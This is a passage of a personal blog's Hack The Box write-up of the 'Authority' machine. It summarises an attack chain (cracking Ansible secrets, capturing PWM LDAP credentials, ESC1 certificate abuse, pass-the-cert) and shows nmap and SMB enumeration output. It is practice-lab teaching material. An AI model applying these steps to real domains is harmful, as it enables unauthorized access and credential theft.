<!DOCTYPE html><html lang="en" data-mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hack The Box - Authority" /><meta property="og:locale" content="en" /><meta name="description" content="Just writing my notes here." /><meta property="og:description" content="Just writing my notes here." /><link rel="canonical" href="https://niraj-maharjan.com.np/posts/Hack-The-Box-Authority/" /><meta property="og:url" content="https://niraj-maharjan.com.np/posts/Hack-The-Box-Authority/" /><meta property="og:site_name" content="Niraj Maharjan" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-07-01T00:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Authority" /><meta name="twitter:site" content="@NirajjjZzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-04T16:23:31-04:00","datePublished":"2025-07-01T00:00:00-04:00","description":"Just writing my notes here.","headline":"Hack The Box - Authority","mainEntityOfPage":{"@type":"WebPage","@id":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Authority/"},"url":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Authority/"}</script><title>Hack The Box - Authority | Niraj Maharjan</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Niraj Maharjan"><meta name="application-name" content="Niraj Maharjan"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-150x150.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Niraj Maharjan</a></div><div class="site-subtitle font-italic">InfoSec Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://linkedin.com/in/niraj-maharjan" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/nirajmaharz" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NirajjjZzz" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['niraj.maharz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Authority</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack The Box - Authority</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1751342400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 1, 2025 </em> </span> <span> Updated <em class="" data-ts="1751660611" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 4, 2025 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Niraj Maharjan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2734 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/Hackthebox/Authority/Authority.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 90% 70%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Authority/Authority.png" width="90%" height="70%" class="lazyload" data-proofer-ignore></a></p><p>Authority is a Windows Domain Controller. We accessed open SMB shares and found some Ansible playbooks. From there, we cracked some encrypted fields to extract credentials for a PWM instance.The PWM instance was running in configuration mode, which allowed us to make it authenticate to our machine over LDAP, exposing plaintext credentials.Using those credentials, we enumerated Active Directory Certificate Services (AD CS) and found it vulnerable to ESC1. Instead of any domain user being allowed to enroll, any domain computer had that permission. So, we added a fake computer to the domain and used it to request a certificate on behalf of the Domain Controller.Although the certificate couldn’t be used for direct logon, we used pass-the-cert attack to dump NTLM hashes and got Administrator access.</p><h2 id="recon"><span class="mr-2">Recon</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Starting with <code class="language-plaintext highlighter-rouge">nmap</code>. <code class="language-plaintext highlighter-rouge">nmap</code> finds a lot of open ports.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>
<span class="nv">$nmap</span> 10.10.11.222 <span class="nt">-oN</span> authority-allports.nmap

Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-03 09:34 CDT
Nmap scan report <span class="k">for </span>10.10.11.222
Host is up <span class="o">(</span>0.050s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 987 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
8443/tcp open  https-alt

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>617.75 seconds

</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
</pre><td class="rouge-code"><pre>
<span class="nv">$nmap</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 53,80,88,135,139,389,445,464,593,636,3268,3269,8443 <span class="nt">-oN</span> authority-service.nmap 10.10.11.222
Nmap scan report <span class="k">for </span>10.10.11.222
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-07-03 18:56:45Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00<span class="p">;</span> +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2025-07-03T18:57:36+00:00<span class="p">;</span> +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00<span class="p">;</span> +4h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: authority.htb, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY<span class="nv">$@</span>htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-07-03T18:57:36+00:00<span class="p">;</span> +4h00m01s from scanner time.
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 03 Jul 2025 18:56:54 GMT
|     Connection: close
|     &lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0;URL='/pwm'"</span>/&gt;&lt;/head&gt;&lt;/html&gt;
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 03 Jul 2025 18:56:53 GMT
|     Connection: close
|     &lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0;URL='/pwm'"</span>/&gt;&lt;/head&gt;&lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 03 Jul 2025 18:56:53 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 03 Jul 2025 18:57:00 GMT
|     Connection: close
|     &lt;<span class="o">!</span>doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP Status 400 
|     Request&lt;/title&gt;&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span> h1, h2, h3, b <span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> h1 <span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
|_    Request&lt;/h1&gt;&lt;hr <span class="nv">class</span><span class="o">=</span><span class="s2">"line"</span> /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found <span class="k">in </span>the HTTP protocol <span class="o">[</span>RTSP&amp;#47<span class="p">;</span>1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error <span class="o">(</span>e.g., malformed request syntax, invalid
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>172.16.2.118
| Not valid before: 2025-07-01T18:05:50
|_Not valid after:  2027-07-04T05:44:14
|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1<span class="o">)</span><span class="nb">.</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V<span class="o">=</span>7.94SVN%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>7/3%Time<span class="o">=</span>68669A34%P<span class="o">=</span>x86_64-pc-linux-
SF:gnu%r<span class="o">(</span>GetRequest,DB,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html
SF:;charset=ISO-8859-1</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2082</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2003</span><span class="se">\x</span><span class="s2">20
SF:Jul</span><span class="se">\x</span><span class="s2">202025</span><span class="se">\x</span><span class="s2">2018:56:53</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n\n\n\n\n\</span><span class="s2">
SF:n&lt;html&gt;&lt;head&gt;&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">refresh</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">0;URL='/pwm'</span><span class="se">\</span><span class="s2">
SF:"</span>/&gt;&lt;/head&gt;&lt;/html&gt;<span class="s2">")%r(HTTPOptions,7D,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20<span class="se">\r\n</span>Allow:<span class="se">\x</span>2
SF:0GET,<span class="se">\x</span>20HEAD,<span class="se">\x</span>20POST,<span class="se">\x</span>20OPTIONS<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>200<span class="se">\r\n</span>Date:<span class="se">\x</span>20
SF:Thu,<span class="se">\x</span>2003<span class="se">\x</span>20Jul<span class="se">\x</span>202025<span class="se">\x</span>2018:56:53<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\</span>
SF:n<span class="se">\r\n</span><span class="s2">")%r(FourOhFourRequest,DB,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>
SF:20text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>2082<span class="se">\r\n</span>Date:<span class="se">\x</span>20Thu
SF:,<span class="se">\x</span>2003<span class="se">\x</span>20Jul<span class="se">\x</span>202025<span class="se">\x</span>2018:56:54<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r</span>
SF:<span class="se">\n\n\n\n\n\n</span>&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\"</span>refresh<span class="se">\"\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span>0<span class="p">;</span>
SF:URL<span class="o">=</span><span class="s1">'/pwm'</span><span class="se">\"</span>/&gt;&lt;/head&gt;&lt;/html&gt;<span class="s2">")%r(RTSPRequest,82C,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\</span>
SF:r<span class="se">\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Language:<span class="se">\x</span>20en<span class="se">\</span>
SF:r<span class="se">\n</span>Content-Length:<span class="se">\x</span>201936<span class="se">\r\n</span>Date:<span class="se">\x</span>20Thu,<span class="se">\x</span>2003<span class="se">\x</span>20Jul<span class="se">\x</span>202025<span class="se">\x</span>2018:
SF:57:00<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>&lt;<span class="o">!</span>doctype<span class="se">\x</span>20html&gt;&lt;html<span class="se">\x</span>20
SF:lang<span class="o">=</span><span class="se">\"</span>en<span class="se">\"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP<span class="se">\x</span>20Status<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\x</span>e2<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>20Bad<span class="se">\x</span>
SF:20Request&lt;/title&gt;&lt;style<span class="se">\x</span><span class="nv">20type</span><span class="o">=</span><span class="se">\"</span>text/css<span class="se">\"</span><span class="o">&gt;</span>body<span class="se">\x</span>20<span class="o">{</span>font-family:Tahom
SF:a,Arial,sans-serif<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h1,<span class="se">\x</span>20h2,<span class="se">\x</span>20h3,<span class="se">\x</span>20b<span class="se">\x</span>20<span class="o">{</span>color:white<span class="p">;</span>backgrou
SF:nd-color:#525D76<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h1<span class="se">\x</span>20<span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h2<span class="se">\x</span>20<span class="o">{</span>font-size:16px<span class="p">;</span>
SF:<span class="o">}</span><span class="se">\x</span>20h3<span class="se">\x</span>20<span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20p<span class="se">\x</span>20<span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20a<span class="se">\x</span>20<span class="o">{</span>color:b
SF:lack<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\.</span>line<span class="se">\x</span>20<span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;
SF:/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="se">\x</span>20Status<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\x</span>e2<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>20Bad<span class="se">\x</span>2
SF:0Request&lt;/h1&gt;&lt;hr<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>line<span class="se">\"\x</span>20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;<span class="se">\x</span>20Exception<span class="se">\x</span>20
SF:Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;<span class="se">\x</span>20Invalid<span class="se">\x</span>20character<span class="se">\x</span>20found<span class="se">\x</span>20in<span class="se">\x</span>20t
SF:he<span class="se">\x</span>20HTTP<span class="se">\x</span>20protocol<span class="se">\x</span>20<span class="se">\[</span>RTSP&amp;#47<span class="p">;</span>1<span class="se">\.</span>00x0d0x0a0x0d0x0a<span class="se">\.\.\.\]</span>&lt;/p&gt;&lt;p
SF:&gt;&lt;b&gt;Description&lt;/b&gt;<span class="se">\x</span>20The<span class="se">\x</span>20server<span class="se">\x</span>20cannot<span class="se">\x</span>20or<span class="se">\x</span>20will<span class="se">\x</span>20not<span class="se">\x</span>20
SF:process<span class="se">\x</span>20the<span class="se">\x</span>20request<span class="se">\x</span>20due<span class="se">\x</span>20to<span class="se">\x</span>20something<span class="se">\x</span>20that<span class="se">\x</span>20is<span class="se">\x</span>20pe
SF:rceived<span class="se">\x</span>20to<span class="se">\x</span>20be<span class="se">\x</span>20a<span class="se">\x</span>20client<span class="se">\x</span>20error<span class="se">\x</span>20<span class="se">\(</span>e<span class="se">\.</span>g<span class="se">\.</span>,<span class="se">\x</span>20malformed<span class="se">\x</span>
SF:20request<span class="se">\x</span>20syntax,<span class="se">\x</span>20invalid<span class="se">\x</span>20<span class="o">)</span><span class="p">;</span>
Service Info: Host: AUTHORITY<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   <span class="nb">date</span>: 2025-07-03T18:57:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>

</pre></table></code></div></div><h3 id="etchosts"><span class="mr-2">/etc/hosts</span><a href="#etchosts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Adding <code class="language-plaintext highlighter-rouge">authority.htb</code> to our hosts file.</p><p><code class="language-plaintext highlighter-rouge">10.10.11.222 authority.htb</code></p><h3 id="port---80"><span class="mr-2">Port - 80</span><a href="#port---80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Port 80 returns a default IIS webpage.</p><p><a href="/assets/Hackthebox/Authority/image-1.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>The 404 page also looks like the default IIS error page.</p><p><a href="/assets/Hackthebox/Authority/image-2.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-2.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="port-8443"><span class="mr-2">Port 8443</span><a href="#port-8443" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Port 8443 redirects to /pwm/.</p><p><a href="/assets/Hackthebox/Authority/image.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>When we click on the arrow we can see more information and the version number of PWM.</p><p><a href="/assets/Hackthebox/Authority/image-3.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-3.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Clicking on any of the tab Configuration Manager and Configuration Editor, it prompts us for password.</p><p><a href="/assets/Hackthebox/Authority/image-4.png" class="popup img-link "><img data-src="/assets/Hackthebox/Authority/image-4.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="smb-enumeration"><span class="mr-2">SMB Enumeration</span><a href="#smb-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using smbmap we can see that we have access to the Development share.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>
smbmap <span class="nt">-H</span> 10.10.11.222 <span class="nt">-u</span> <span class="s1">'anonymous'</span> <span class="nt">-p</span> <span class="s1">''</span>
<span class="o">[</span>+] Guest session   	IP: 10.10.11.222:445	Name: authority.htb                                     
        Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	Department Shares                                 	NO ACCESS	
	Development                                       	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 

</pre></table></code></div></div><h3 id="smbclient"><span class="mr-2">Smbclient</span><a href="#smbclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, we will use smbclinet will null authentication to view and download all the files locally.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>
<span class="nv">$smbclient</span> <span class="nt">-N</span> //10.10.11.222/Development 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Mar 17 08:20:38 2023
  ..                                  D        0  Fri Mar 17 08:20:38 2023
  Automation                          D        0  Fri Mar 17 08:20:40 2023

smb: <span class="se">\&gt;</span> RECURSE ON
smb: <span class="se">\&gt;</span> prompt no
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\A</span>DCS<span class="se">\.</span>ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint <span class="o">(</span>0.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.9 KiloBytes/sec<span class="o">)</span>
